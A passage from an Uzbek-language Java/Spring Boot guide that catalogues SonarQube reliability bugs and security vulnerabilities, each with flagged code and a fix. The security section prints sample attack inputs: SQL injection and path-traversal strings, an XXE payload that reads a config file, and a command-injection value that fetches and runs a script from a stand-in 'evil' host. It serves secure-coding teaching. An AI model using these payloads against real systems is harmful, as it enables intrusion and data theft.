Sonar operandlarning turi boxed ekanini ko'radi va `==` qiymat emas, havola solishtirishini aytadi. Integer cache faqat kichik qiymatlarda tasodifan ishlaydi, shuning uchun xato test ma'lumotida ko'rinmaydi va production da chiqadi.

```java
// TUZATILGAN: qiymat solishtirish
if (Objects.equals(paymentId, expectedId)) {
    confirm(payment);
}
```

Boxed turlar uchun har doim `Objects.equals`, primitive uchun `==` ishlating.

### 25.7 Suzuvchi nuqtali sonlarni == bilan solishtirish va pul uchun double

```java
// SHIKOYAT: pul double da va tenglik aniq emas
double total = 0.1 + 0.2;
if (total == 0.3) {           // false
    markOrderPaid(orderId);
}
```

Sonar suzuvchi nuqta tengligini alohida qoida bilan belgilaydi, chunki ikkilik kasr o'nlik summani aniq ifodalay olmaydi. Pul uchun esa muammo kattaroq: yuzlab tranzaksiyadan keyin yig'indi tiyinlarga xato beradi va hisobot bilan bank ekstrakti mos kelmaydi.

```java
// TUZATILGAN: BigDecimal va aniq masshtab
BigDecimal total = new BigDecimal("0.10").add(new BigDecimal("0.20"));
if (total.compareTo(new BigDecimal("0.30")) == 0) {
    markOrderPaid(orderId);
}
```

Pulni `BigDecimal` da, bazada `numeric(19,4)` da saqlang va `equals` emas `compareTo` bilan solishtiring.

### 25.8 Metod natijasini e'tiborsiz qoldirish

```java
// SHIKOYAT: natija tashlab ketilgan
public void normalize(PaymentRequest request) {
    request.getReference().trim();          // natija yo'qoladi
    BigDecimal.ONE.add(request.getFee());   // natija yo'qoladi
}
```

Sonar o'zgarmas obyektlarning metodlari natijasiz chaqirilganini ko'radi va buni bug deb belgilaydi. `String` va `BigDecimal` immutable, shuning uchun bunday chaqiruv hech narsani o'zgartirmaydi va kod yolg'on ishonch beradi.

```java
// TUZATILGAN: natija ishlatilgan
public PaymentRequest normalize(PaymentRequest request) {
    return request
            .withReference(request.getReference().trim())
            .withFee(BigDecimal.ONE.add(request.getFee()));
}
```

Immutable turlar bilan ishlaganda har bir chaqiruv natijasini o'zlashtiring yoki qaytaring.

### 25.9 InterruptedException ni yutib yuborish

```java
// SHIKOYAT: interrupt holati yo'qotilgan
try {
    Thread.sleep(retryDelayMs);
} catch (InterruptedException e) {
    log.warn("kutish uzildi");   // holat tiklanmagan
}
```

Sonar bu istisnoni maxsus holat deb biladi: uni yutib yuborsangiz, thread ga berilgan to'xtash signali yo'qoladi. Natijada to'lov retry sikli shutdown paytida ham aylanishda davom etadi va pod majburan o'ldiriladi.

```java
// TUZATILGAN: holat tiklangan va sikl to'xtagan
try {
    Thread.sleep(retryDelayMs);
} catch (InterruptedException e) {
    Thread.currentThread().interrupt();
    throw new PaymentRetryAbortedException(e);
}
```

`InterruptedException` ni ushlasangiz, `Thread.currentThread().interrupt()` ni chaqirib keyin chiqib keting.

### 25.10 Har doim bir xil natija beradigan shart va yetib bo'lmaydigan kod

```java
// SHIKOYAT: ikkinchi tekshiruv har doim false, keyingi qator yetib bo'lmaydi
if (order == null) {
    return Status.REJECTED;
}
if (order == null) {              // har doim false
    log.error("buyurtma yo'q");
    return Status.REJECTED;       // unreachable
}
```

Sonar oqim tahlili bilan shartning qiymati allaqachon aniqlanganini isbotlaydi. Bunday joy odatda copy-paste yoki yarim tuzatilgan refactoring izi bo'ladi va haqiqiy tekshiruv o'rnini egallaydi.

```java
// TUZATILGAN: bitta tekshiruv, keyin haqiqiy mantiq
if (order == null) {
    log.error("buyurtma yo'q: {}", orderId);
    return Status.REJECTED;
}
return order.isPaid() ? Status.SHIPPED : Status.WAITING_PAYMENT;
```

Bu qoidani ogohlantirish emas, mantiqiy xato signali deb o'qing.

### 25.11 To'plamni iteratsiya paytida o'zgartirish

```java
// SHIKOYAT: iteratsiya paytida o'chirish
for (OrderLine line : order.getLines()) {
    if (line.getQuantity() == 0) {
        order.getLines().remove(line);   // ConcurrentModificationException
    }
}
```

Sonar `for-each` ichida xuddi shu to'plamga modifikatsiya chaqirig'ini ko'radi. Xato ba'zan chiqmaydi, masalan oxirgidan bitta oldingi elementda, shuning uchun test yashil bo'lib production da tushadi.

```java
// TUZATILGAN: removeIf yoki Iterator
order.getLines().removeIf(line -> line.getQuantity() == 0);
```

Filtrlash uchun `removeIf` yoki yangi ro'yxat yig'ishni ishlating.

### 25.12 Collectors.toMap da takroriy kalit

```java
// SHIKOYAT: bir SKU bir necha qatorda uchraydi
Map<String, Integer> stock = lines.stream()
        .collect(Collectors.toMap(
                StockLine::getSku,
                StockLine::getQuantity));   // IllegalStateException
```

Ikki argumentli `toMap` takroriy kalitda istisno tashlaydi va Sonar merge funksiyasi yo'qligini xavf deb belgilaydi. Ombor hisobotida bitta SKU bir necha javonda turishi odatiy hol, demak bu xato ertami kechmi chiqadi.

```java
// TUZATILGAN: merge mantiqi aniq ko'rsatilgan
Map<String, Integer> stock = lines.stream()
        .collect(Collectors.toMap(
                StockLine::getSku,
                StockLine::getQuantity,
                Integer::sum));
```

`toMap` ni har doim uchinchi, merge argumenti bilan yozing.

### 25.13 Sanani noto'g'ri formatlash va SimpleDateFormat ni baham ko'rish

```java
// SHIKOYAT: static va thread-safe emas, format naqshi ham xato
private static final SimpleDateFormat FMT =
        new SimpleDateFormat("YYYY-mm-DD");   // yil, daqiqa, kun xato
public String settlementDay(Date d) {
    return FMT.format(d);
}
```

Sonar ikki narsani belgilaydi: thread-safe bo'lmagan obyekt static maydonda saqlanmoqda va format naqshi mantiqan xato. `YYYY` hafta asosidagi yil, `mm` daqiqa, `DD` yil kuni, demak yil oxirida to'lov kuni butunlay boshqa chiqadi.

```java
// TUZATILGAN: immutable formatter va to'g'ri naqsh
private static final DateTimeFormatter FMT =
        DateTimeFormatter.ofPattern("yyyy-MM-dd");
public String settlementDay(LocalDate d) {
    return FMT.format(d);
}
```

`java.time` ga o'ting, `DateTimeFormatter` immutable va thread-safe.

### 25.14 compareTo va equals nomuvofiqligi

```java
// SHIKOYAT: compareTo faqat summani, equals esa id ni solishtiradi
public int compareTo(Payment other) {
    return amount.compareTo(other.amount);
}
@Override public boolean equals(Object o) {
    return o instanceof Payment p && id.equals(p.id);
}
```

Sonar `Comparable` va `equals` kontraktlari mos kelmasligini aytadi. `TreeSet` tenglikni `compareTo` orqali aniqlaydi, shuning uchun bir xil summali ikki boshqa to'lovdan bittasi yo'qoladi.

```java
// TUZATILGAN: compareTo tartibni, equals identifikatorni, ikkisi mos
public int compareTo(Payment other) {
    int byAmount = amount.compareTo(other.amount);
    return byAmount != 0 ? byAmount : id.compareTo(other.id);
}
```

Tartiblash kaliti oxirida identifikatorni qo'shib, nol faqat haqiqiy tenglikda chiqishini ta'minlang.

### 25.15 Sikl o'zgaruvchisini ichkarida o'zgartirish yoki cheksiz sikl xavfi

```java
// SHIKOYAT: counter tanada o'zgartirilgan, shart esa o'zgarmaydi
for (int i = 0; i < lines.size(); i++) {
    if (lines.get(i).isCancelled()) {
        i++;                 // qator o'tkazib yuboriladi
    }
}
int attempt = 0;
while (attempt < maxAttempts) {
    send(payment);           // attempt hech qachon oshmaydi
}
```

Birinchi holatda Sonar sikl counteri tanada o'zgartirilganini, ikkinchisida sikl shartiga ta'sir qiluvchi hech narsa o'zgarmasligini aniqlaydi. Cheksiz sikl to'lov yuborishni takrorlab, bir buyurtmani o'nlab marta hisobdan chiqarishi mumkin.

```java
// TUZATILGAN: niyat aniq ifodalangan
lines.stream().filter(line -> !line.isCancelled()).forEach(this::ship);
for (int attempt = 1; attempt <= maxAttempts; attempt++) {
    if (send(payment)) {
        return;
    }
}
```

Sikl o'rniga stream yoki aniq qadamli `for` yozing, counter faqat bitta joyda o'zgarsin.

### 25.16 Tuzoq va yechim

| Tuzoq | Nega yuzaga keladi | Yechim |
|---|---|---|
| Bug ni `@SuppressWarnings` bilan yopish | tezda yashil gate kerak | sababini tuzatish, bostirishni code review da taqiqlash |
| Null tekshiruvni hamma joyga qo'shish | oqim tahlili tushunmaydi | `Optional` va `@Nullable` bilan kontraktni aniq qilish |
| Resurs qoidasini faqat SonarLint da ko'rish | lokal profil farq qiladi | profilni serverdan ulash, `sonar.qualityProfile` ni bir xil tutish |
| Test yozmasdan bug ni tuzatish | issue yopildi deb hisoblash | har bir reliability tuzatishga regress test qo'shish |
| `double` ni faqat yangi kodda almashtirish | migratsiya qiyin ko'rinadi | DTO chegarasida konvertatsiya qilib, ichkarida `BigDecimal` saqlash |
| Cheksiz sikl ni timeout bilan yashirish | simptom yo'qoladi | shartni o'zgartiruvchi qadamni siklga qaytarish |

### 25.17 Oddiy yondashuv va arxitektor yondashuvi

| Mavzu | Oddiy yondashuv | Arxitektor yondashuvi |
|---|---|---|
| Null | kerak joyda `if (x != null)` | kontraktda `Optional`, chegarada validatsiya |
| Pul turi | `double` yetadi | `BigDecimal` va bazada `numeric`, konvertatsiya bitta joyda |
| Resurs | `finally` da `close()` | try-with-resources majburiy, ArchUnit bilan nazorat |
| Tenglik | `==` tez yozish | `Objects.equals`, qiymat obyekti `record` |
| Istisno | `catch (Exception e) { log }` | tur bo'yicha ushlash, interrupt holatini tiklash |
| Takroriy kalit | ishlayapti, demak yo'q | `toMap` da merge funksiyasi standart talab |
| Bug ni yopish | bostirish annotatsiyasi | sababni tuzatish, regress test, gate o'zgarmaydi |
| Qoidalar to'plami | default profil | loyiha profili versiyalanadi va o'zgarishi review qilinadi |
| O'lchov | umumiy issue soni | yangi kod reliability rating va bug soni |

### 25.18 Katalogni loyihada tekshirish

Bu holatlarni qo'lda qidirmang, skan natijasini yangi kod bo'yicha filtrlang.

```bash
# faqat yangi kod bo'yicha skan, PR branch uchun
./mvnw -B verify sonar:sonar \
  -Dsonar.projectKey=payment-service \
  -Dsonar.pullrequest.key="$PR_NUMBER" \
  -Dsonar.pullrequest.branch="$BRANCH" \
  -Dsonar.pullrequest.base=main
```

```properties
# sonar-project.properties: reliability qoidalari uchun kerakli minimal sozlama
sonar.java.source=21
sonar.sources=src/main/java
sonar.tests=src/test/java
sonar.coverage.jacoco.xmlReportPaths=target/site/jacoco/jacoco.xml
sonar.qualitygate.wait=true
```

```xml
<!-- JaCoCo hisoboti bo'lmasa Sonar coverage ni nol deb ko'rsatadi -->
<plugin>
  <groupId>org.jacoco</groupId>
  <artifactId>jacoco-maven-plugin</artifactId>
  <version>0.8.12</version>
  <executions>
    <execution><goals><goal>prepare-agent</goal></goals></execution>
    <execution><id>report</id><phase>verify</phase>
      <goals><goal>report</goal></goals></execution>
  </executions>
</plugin>
```

```yaml
# CI: gate qizil bo'lsa pipeline to'xtaydi
jobs:
  sonar:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }   # yangi kod hisobi uchun butun tarix kerak
      - run: ./mvnw -B verify sonar:sonar
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
```

Har bir tuzatishga test kerak, lekin test uslublari testlash qo'llanmasidagi unit test va Testcontainers mavzularida yoritilgan.

### 25.19 Amalda qo'llash

- [ ] Faol quality profile dan reliability qoidalari ro'yxatini eksport qilib, bu katalogdagi 14 holat yoqilganini tekshiring.
- [ ] Repository va servis metodlarida `null` qaytaradigan signaturalarni `Optional` ga o'tkazing va `get()` chaqiruvlarini `orElseThrow` ga almashtiring.
- [ ] Kod bazasida `new SimpleDateFormat` va `static` formatter maydonlarini qidirib, `DateTimeFormatter` ga ko'chiring.
- [ ] Pul maydonlarini sanab chiqing: `double` yoki `float` bo'lsa `BigDecimal` ga, bazada `numeric(19,4)` ga o'tkazing.
- [ ] Barcha `Collectors.toMap` chaqiruvlariga merge funksiyasi qo'shing yoki `groupingBy` ga almashtiring.
- [ ] `catch (InterruptedException` ni qidirib, har birida `Thread.currentThread().interrupt()` borligini tasdiqlang.
- [ ] Har bir yopilgan reliability issue uchun xatoni qayta chiqaradigan regress test yozib, uni PR ga qo'shing.
- [ ] Quality gate ga "yangi kod bug soni = 0" shartini qo'ying va `sonar.qualitygate.wait=true` bilan pipeline ni bloklang.

## 26. Xato katalogi: security (vulnerability va hotspot) (Catalog: Security)

Security toifasi Sonar da ikki xil belgilanadi. `Vulnerability` deganda analizator kodda haqiqiy zaiflik yo'lini ko'rgan, ya'ni ishonchsiz manbadan xavfli nuqtaga oqim bor. `Security hotspot` deganda esa kod xavfli bo'lishi mumkin, lekin buni faqat odam kontekstni bilib hal qiladi, shuning uchun hotspot quality gate da avtomatik "fail" bermaydi, u ko'rib chiqilishi kerak. Quyida Spring Boot 3 va PostgreSQL loyihasida eng ko'p uchraydigan holatlar, har birida shikoyat qilinadigan kod va tuzatilgan variant bor.

| Kod holati | Sonar nima deydi | Toifa | Jiddiylik (taxminan) | Ta'siri |
| --- | --- | --- | --- | --- |
| SQL ni `+` bilan birlashtirish | So'rovni formatlash xavfli, kiritma tozalanmagan | hotspot, oqim ko'rinsa vulnerability | blocker yoki high | Butun baza o'qiladi yoki o'chiriladi |
| JPQL ga foydalanuvchi matnini qo'yish | JPQL injection, parametr ishlatilmagan | vulnerability | high | Boshqa tenant ma'lumoti chiqadi |
| `@Query(nativeQuery = true)` ichida konkatenatsiya | Native query injection | vulnerability | high | `pg_catalog` orqali sxema ochiladi |
| Kodda yozilgan parol yoki token | Hard-coded credentials topildi | vulnerability | blocker yoki high | Git tarixida abadiy qoladi |
| `MD5` yoki `SHA-1` bilan parol hash | Zaif hash algoritmi ishlatilgan | hotspot | high | Rainbow table bilan parol ochiladi |
| `new Random()` bilan token yasash | PRNG xavfsizlik uchun yaroqsiz | hotspot | high | Token taxmin qilinadi |
| Fayl yo'lini kiritmadan qurish | Path traversal, I/O chaqiruvi himoyasiz | vulnerability | high | `../../etc/passwd` o'qiladi |
| `Runtime.exec` ga kiritma uzatish | OS command injection | vulnerability | blocker | Serverda buyruq bajariladi |
| `ObjectInputStream.readObject` | Ishonchsiz deserializatsiya | vulnerability | blocker | Gadget chain bilan RCE |
| Log ga tozalanmagan kiritma | Log injection, maxfiy maydon oshkor | vulnerability yoki hotspot | medium yoki high | Log forging va PII leak |
| `permitAll()` keng yo'lga berilgan | Endpoint himoyasiz qolgan | vulnerability | high | Admin API ochiq turadi |
| `csrf().disable()` | CSRF himoyasi o'chirilgan | hotspot | medium yoki high | Sessiya bilan yolg'on so'rov |
| `allowedOrigins("*")` plus credentials | CORS siyosati juda ruxsatli | hotspot | medium | Brauzerdan ma'lumot o'g'irlanadi |
| Sertifikat tekshiruvini o'chirish | TLS da server sertifikati tekshirilmaydi | vulnerability | blocker | MITM, trafik ochiladi |
| XML parser default sozlamada | XXE ga qarshi himoya yo'q | vulnerability | high | Fayl o'qish va SSRF |
| Istisno matnini javobda qaytarish | Debug ma'lumoti tashqariga chiqadi | hotspot | medium | Sxema va yo'llar oshkor |

### 26.1 SQL ni satr birlashtirish bilan qurish

Eng ko'p uchraydigan holat `JdbcTemplate` yoki `Statement` ga tayyor satr berish. Sonar bu yerda avval formatlashni hotspot deb belgilaydi, agar kiritma `@RequestParam` dan kelganini ko'rsa, uni to'g'ridan to'g'ri vulnerability ga ko'taradi.

```java
// SHIKOYAT: so'rov satri foydalanuvchi kiritmasidan yig'ilgan
@GetMapping("/orders")
public List<OrderRow> search(@RequestParam String status) {
    String sql = "SELECT id, total FROM orders WHERE status = '" + status + "'";
    return jdbc.query(sql, new OrderRowMapper()); // injection nuqtasi
}
```

Nega xavfli: `status` qiymatiga `' OR 1=1 --` yozilsa filtr yo'qoladi. PostgreSQL da nuqtali vergul bilan ikkinchi buyruq ham qo'shilishi mumkin. Sonar buni `java:S3649` va formatlash uchun `java:S2077` sifatida ko'rsatadi.

```java
// TUZATILGAN: parametr bilan, PostgreSQL driver uni bind qiladi
private static final String SQL =
    "SELECT id, total FROM orders WHERE status = ?";

@GetMapping("/orders")
public List<OrderRow> search(@RequestParam OrderStatus status) {
    return jdbc.query(SQL, new OrderRowMapper(), status.name());
}
```

Farq PostgreSQL log ida ko'rinadi.

```sql
-- konkatenatsiya: hujumchi matni so'rov tanasiga aylangan
SELECT id, total FROM orders WHERE status = '' OR 1=1 --';

-- bind parametr: qiymat alohida keladi, grammatikaga ta'sir qilmaydi
SELECT id, total FROM orders WHERE status = $1;
```

Tavsiya: so'rov satri `static final` konstanta bo'lsin va unga hech qachon o'zgaruvchi qo'shilmasin.

### 26.2 JPQL va native query da kiritmani bevosita qo'yish

JPA ishlatilgani injection dan himoya qilmaydi. `EntityManager.createQuery` ga yig'ilgan satr berilsa, Sonar oqimni xuddi JDBC dek kuzatadi.

```java
// SHIKOYAT: JPQL ham, native query ham konkatenatsiya qilingan
public List<Invoice> byCustomer(String name, String sortColumn) {
    return em.createQuery(
        "SELECT i FROM Invoice i WHERE i.customer.name = '" + name + "'",
        Invoice.class).getResultList();
}

@Query(value = "SELECT * FROM invoice ORDER BY " + "#{#sort}",
       nativeQuery = true)
List<Invoice> all(String sort); // tartiblash ustuni ham xavfli
```

Nega xavfli: JPQL injection bilan `OR 1=1` qo'shib boshqa mijoz hisob fakturasi olinadi. Tartiblash ustunini parametr qilib bog'lash mumkin emas, shuning uchun u alohida xavf.

```java
// TUZATILGAN: nomlangan parametr va ustun uchun oq ro'yxat
private static final Set<String> SORTABLE = Set.of("issued_at", "total");

public List<Invoice> byCustomer(String name, String sortColumn) {
    String column = SORTABLE.contains(sortColumn) ? sortColumn : "issued_at";
    return em.createQuery(
            "SELECT i FROM Invoice i WHERE i.customer.name = :name ORDER BY i."
                + column, Invoice.class)
        .setParameter("name", name)
        .getResultList();
}
```

Tavsiya: qiymat uchun har doim parametr, identifikator uchun har doim oq ro'yxat ishlatilsin.

### 26.3 Kodda qattiq yozilgan parol, token yoki API kalit

Sonar `java:S2068` bilan maydon nomi va qiymat naqshiga qarab ishlaydi. `password`, `secret`, `token`, `apiKey` kabi nomga satr literal berilsa, issue paydo bo'ladi.

```java
// SHIKOYAT: parol va kalit kodda
public class PaymentGatewayClient {
    private static final String API_KEY = "sk_live_51H8ZqK9vT";
    private static final String DB_PASSWORD = "Postgres123!";
}
```

Nega xavfli: repoga kirgan har bir odam va har bir CI log kalitni ko'radi.

```java
// TUZATILGAN: tashqi konfiguratsiyadan oladi
@ConfigurationProperties("payment.gateway")
public record GatewayProps(@NotBlank String apiKey, @NotBlank String baseUrl) {}
```

```properties
# qiymat environment yoki vault dan keladi, kodda yo'q
payment.gateway.base-url=https://api.gateway.example
payment.gateway.api-key=${PAYMENT_API_KEY}
spring.datasource.url=jdbc:postgresql://db:5432/billing
spring.datasource.password=${DB_PASSWORD}
```

Tavsiya: har bir maxfiy qiymat `${ENV_VAR}` orqali kirsin va ilova start da uning bo'sh emasligini tekshirsin.

### 26.4 Zaif hash algoritmi bilan parol saqlash

`MessageDigest.getInstance("MD5")` yoki `"SHA-1"` Sonar da `java:S4790` hotspot beradi.

```java
// SHIKOYAT: MD5 va saltsiz hash
public String hash(String rawPassword) throws Exception {
    MessageDigest md = MessageDigest.getInstance("MD5");
    return HexFormat.of().formatHex(md.digest(rawPassword.getBytes(UTF_8)));
}
```

Nega xavfli: MD5 juda tez, GPU da sekundda milliardlab urinish bo'ladi. Salt yo'qligi bir xil parollarni bir xil hash ga aylantiradi.

```java
// TUZATILGAN: BCrypt, ishlash narxi sozlanadigan
@Bean
PasswordEncoder passwordEncoder() {
    // delegating encoder saqlangan prefiks bo'yicha algoritmni tanlaydi
    return PasswordEncoderFactories.createDelegatingPasswordEncoder();
}

public void register(String login, String rawPassword) {
    users.save(new User(login, passwordEncoder.encode(rawPassword)));
}
```

Tavsiya: parol uchun faqat `PasswordEncoder` ishlatilsin, `MessageDigest` esa fayl summasi uchun qolsin.

### 26.5 Random ni xavfsizlik uchun ishlatish

`java.util.Random` va `Math.random()` Sonar da `java:S2245` hotspot beradi.

```java
// SHIKOYAT: parolni tiklash tokeni oddiy PRNG dan
private final Random random = new Random();

public String resetToken() {
    return Long.toHexString(random.nextLong()); // taxmin qilinadi
}
```

Nega xavfli: `Random` 48 bitli urug' bilan ishlaydi va ketma ketligi oldindan hisoblanadi. Bir token ko'rgan hujumchi keyingisini tiklay oladi, shuning uchun u boshqa foydalanuvchi parolini almashtiradi.

```java
// TUZATILGAN: SecureRandom va 256 bit entropiya
private static final SecureRandom SECURE = new SecureRandom();

public String resetToken() {
    byte[] bytes = new byte[32];
    SECURE.nextBytes(bytes);
    return Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);
}
```

Tavsiya: token, nonce, parol tiklash kodi va sessiya identifikatori uchun faqat `SecureRandom`.

### 26.6 Fayl yo'lini foydalanuvchi kiritmasidan qurish

Hisobot yuklab olish endpointi klassik misol. Sonar `java:S2083` bilan path injection oqimini ko'rsatadi.

```java
// SHIKOYAT: fayl nomi to'g'ridan to'g'ri yo'lga qo'shiladi
@GetMapping("/reports/{name}")
public Resource download(@PathVariable String name) throws IOException {
    Path file = Path.of("/var/app/reports", name); // ../ bilan chiqib ketadi
    return new InputStreamResource(Files.newInputStream(file));
}
```

Nega xavfli: `name` ga `../../etc/passwd` yoki `../../config/application.properties` berilsa, ilova baza paroli bor faylni qaytaradi.

```java
// TUZATILGAN: normalizatsiya va bazaviy katalog tekshiruvi
private static final Path BASE = Path.of("/var/app/reports").toAbsolutePath().normalize();

@GetMapping("/reports/{name}")
public Resource download(@PathVariable String name) throws IOException {
    Path file = BASE.resolve(name).normalize();
    if (!file.startsWith(BASE)) {
        throw new AccessDeniedException("yo'l bazaviy katalogdan tashqarida");
    }
    return new InputStreamResource(Files.newInputStream(file));
}
```

Tavsiya: fayl nomini bazadagi identifikator bilan almashtirish eng ishonchli yo'l, chunki kiritma yo'lga umuman tegmaydi.

### 26.7 Tashqi buyruq bajarish va argumentlarni tekshirmaslik

Sonar `java:S2076` bilan command injection ni belgilaydi. Shell orqali chaqirish ayniqsa xavfli, chunki metabelgilar ishlaydi.

```java
// SHIKOYAT: shell ga satr uzatiladi
public void exportBackup(String dbName) throws IOException {
    Runtime.getRuntime().exec("/bin/sh -c pg_dump " + dbName + " > /tmp/d.sql");
}
```

Nega xavfli: `dbName` ga `billing; curl http://evil/x | sh` yozilsa, ikkinchi buyruq ham bajariladi. Bu to'g'ridan to'g'ri server ustidan nazorat beradi.

```java
// TUZATILGAN: argumentlar ro'yxati, shell yo'q, nom oq ro'yxatdan
private static final Pattern DB_NAME = Pattern.compile("^[a-z_][a-z0-9_]{0,62}$");

public void exportBackup(String dbName) throws IOException, InterruptedException {
    if (!DB_NAME.matcher(dbName).matches()) {
        throw new IllegalArgumentException("baza nomi yaroqsiz");
    }
    Process p = new ProcessBuilder("pg_dump", "--no-password", dbName)
        .redirectOutput(Path.of("/tmp/dump.sql").toFile())
        .start();
    if (p.waitFor() != 0) throw new IllegalStateException("pg_dump xato tugadi");
}
```

Tavsiya: `ProcessBuilder` ga alohida argumentlar berilsin va shell umuman ishtirok etmasin.

### 26.8 Ishonchsiz manbadan deserializatsiya

`ObjectInputStream.readObject()` tashqi baytlarga ishlanganda Sonar `java:S5135` bilan shikoyat qiladi.

```java
// SHIKOYAT: queue dan kelgan baytlar Java serializatsiyasi bilan o'qiladi
public OrderEvent parse(byte[] payload) throws Exception {
    try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(payload))) {
        return (OrderEvent) in.readObject(); // ixtiyoriy klass yuklanadi
    }
}
```

Nega xavfli: `readObject` o'qish paytida klass konstruktorlari va `readObject` metodlarini ishga tushiradi. Classpath da mos kutubxona bo'lsa, hujumchi buyruq bajaradi.

```java
// TUZATILGAN: JSON va qat'iy tiplash, polimorfizm o'chirilgan
private final ObjectMapper mapper = JsonMapper.builder()
    .disable(MapperFeature.USE_STD_BEAN_NAMING)
    .deactivateDefaultTyping() // tip ma'lumoti payload dan kelmaydi
    .build();

public OrderEvent parse(byte[] payload) throws IOException {
    return mapper.readValue(payload, OrderEvent.class);
}
```

Tavsiya: tashqi ma'lumot uchun Java serializatsiyasi tanlanmasin, JSON yoki Protobuf bo'lsin.

### 26.9 Loglarda maxfiy ma'lumot yoki kiritmani yozish

Ikki xil shikoyat bor. Birinchisi `java:S5145` log injection, ya'ni foydalanuvchi matnida yangi qator belgisi bo'lishi. Ikkinchisi maxfiy maydonning log ga tushishi, bu ko'pincha hotspot sifatida ko'rinadi.

```java
// SHIKOYAT: karta raqami va tozalanmagan kiritma log ga tushadi
log.info("to'lov qabul qilindi: karta={}, mijoz={}", card.getNumber(), request.getComment());
log.debug("so'rov tanasi: {}", mapper.writeValueAsString(request)); // hamma maydon
```

Nega xavfli: `comment` ichidagi `\n` bilan hujumchi yolg'on log qatori yozadi va audit izini buzadi. Karta raqami va token log da qolsa, log tizimi yangi maxfiy ma'lumot ombori bo'ladi.

```java
// TUZATILGAN: maskalash va bir qatorga siqish
private static String oneLine(String value) {
    return value == null ? "" : value.replaceAll("[\\r\\n\\t]", " ");
}

log.info("to'lov qabul qilindi: karta={}, izoh={}",
    PanMasker.mask(card.getNumber()),   // 411111******1111
    oneLine(request.getComment()));
```

Tavsiya: maxfiy maydonli DTO da `toString` qo'lda yozilsin va u faqat maskalangan qiymat qaytarsin.

### 26.10 Spring Security da endpoint ochiq qolishi

Sonar Spring konfiguratsiyasidagi juda keng ruxsatni va autentifikatsiyasiz qolgan yo'lni aniqlaydi. Tekshiruvlar versiyaga qarab farq qiladi, shuning uchun qoida kaliti emas, mazmuni muhim.

```java
// SHIKOYAT: hamma narsa ochiq, admin yo'li ham
http.authorizeHttpRequests(a -> a
        .requestMatchers("/api/**").permitAll()      // juda keng
        .anyRequest().permitAll());                  // default ham ochiq
```

Nega xavfli: `/api/**` ichida `/api/admin/users` ham bor. Yangi controller qo'shilganda u avtomatik ochiq bo'ladi, chunki default ruxsat `permitAll`.

```java
// TUZATILGAN: default yopiq, ochiq yo'llar aniq sanab o'tilgan
http.authorizeHttpRequests(a -> a
        .requestMatchers("/actuator/health", "/api/public/**").permitAll()
        .requestMatchers("/api/admin/**").hasRole("ADMIN")
        .anyRequest().authenticated())               // default yopiq
    .httpBasic(Customizer.withDefaults());
```

Tavsiya: `anyRequest().authenticated()` har doim oxirgi qator bo'lsin va yangi yo'l ochish ongli qaror bo'lib qolsin.

### 26.11 CSRF yoki CORS ni asossiz o'chirish

`csrf(csrf -> csrf.disable())` Sonar da `java:S4502` hotspot, keng CORS esa `java:S5122` hotspot beradi. Stateless JWT API da CSRF ni o'chirish asosli bo'lishi mumkin, lekin sessiya cookie ishlatilsa bu aniq zaiflik.

```java
// SHIKOYAT: CSRF o'chirilgan, lekin sessiya cookie ishlatiladi
http.csrf(csrf -> csrf.disable())
    .cors(cors -> cors.configurationSource(r -> {
        CorsConfiguration c = new CorsConfiguration();
        c.setAllowedOrigins(List.of("*"));
        c.setAllowCredentials(true); // yulduzcha bilan birga xavfli
        return c;
    }));
```

Nega xavfli: hujumchi sahifasi brauzerdagi sessiya cookie bilan `POST /api/payments` yuboradi. Keng CORS esa javobni o'qishga ham ruxsat beradi.

```yaml
# TUZATILGAN: origin ro'yxati konfiguratsiyada, kodda yulduzcha yo'q
app:
  cors:
    allowed-origins:
      - https://admin.example.com
      - https://app.example.com
    allowed-methods: [GET, POST, PUT, DELETE]
    allow-credentials: true
    max-age: 1800
```

Tavsiya: CSRF ni o'chirish faqat token bilan ishlovchi stateless API da va hotspot izohida sabab yozilgan holda qabul qilinsin.

### 26.12 TLS sertifikat tekshiruvini o'chirib qo'yish

Bo'sh `TrustManager` yoki har doim `true` qaytaruvchi `HostnameVerifier` Sonar da `java:S4830` bilan belgilanadi va bu vulnerability, hotspot emas.

```java
// SHIKOYAT: hamma sertifikatga ishonadigan trust manager
TrustManager[] all = { new X509TrustManager() {
    public void checkClientTrusted(X509Certificate[] c, String a) { }
    public void checkServerTrusted(X509Certificate[] c, String a) { } // tekshiruv yo'q
    public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
}};
SSLContext ctx = SSLContext.getInstance("TLS");
ctx.init(null, all, new SecureRandom());
```

Nega xavfli: shifrlash qoladi, lekin kim bilan gaplashayotganini bilmaslik qoladi. Proksi o'zini to'lov shlyuzi deb ko'rsatadi.

```bash
# TUZATILGAN: ishonch ichki CA ni truststore ga qo'shish bilan yechiladi
keytool -importcert -noprompt -alias corp-ca \
  -file corp-root-ca.pem \
  -keystore /opt/app/truststore.p12 -storetype PKCS12 \
  -storepass "$TRUSTSTORE_PASSWORD"

# ilova shu truststore ni ishlatadi, kodda hech narsa o'chirilmaydi
java -Djavax.net.ssl.trustStore=/opt/app/truststore.p12 \
     -Djavax.net.ssl.trustStoreType=PKCS12 -jar app.jar
```

Tavsiya: self-signed sertifikat muammosi truststore bilan hal qilinsin, kodda tekshiruv o'chirilmasin.

### 26.13 XML va XXE xavfi

`DocumentBuilderFactory`, `SAXParserFactory` va `XMLInputFactory` default holatda tashqi entity ni yuklaydi. Sonar bu holatni `java:S2755` bilan ko'rsatadi.

```xml
<!-- SHIKOYAT: shunday payload default parserda ishlaydi -->
<?xml version="1.0"?>
<!DOCTYPE invoice [
  <!ENTITY secret SYSTEM "file:///opt/app/application.properties">
]>
<invoice><note>&secret;</note></invoice>
```

Nega xavfli: parser faylni o'qib `note` ichiga qo'yadi, javobda esa baza paroli ko'rinadi. `SYSTEM "http://..."` varianti bilan ichki tarmoqqa SSRF qilinadi.

```java
// TUZATILGAN: DOCTYPE umuman taqiqlanadi
DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();
f.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
f.setFeature("http://xml.org/sax/features/external-general-entities", false);
f.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
f.setXIncludeAware(false);
f.setExpandEntityReferences(false);
Document doc = f.newDocumentBuilder().parse(input);
```

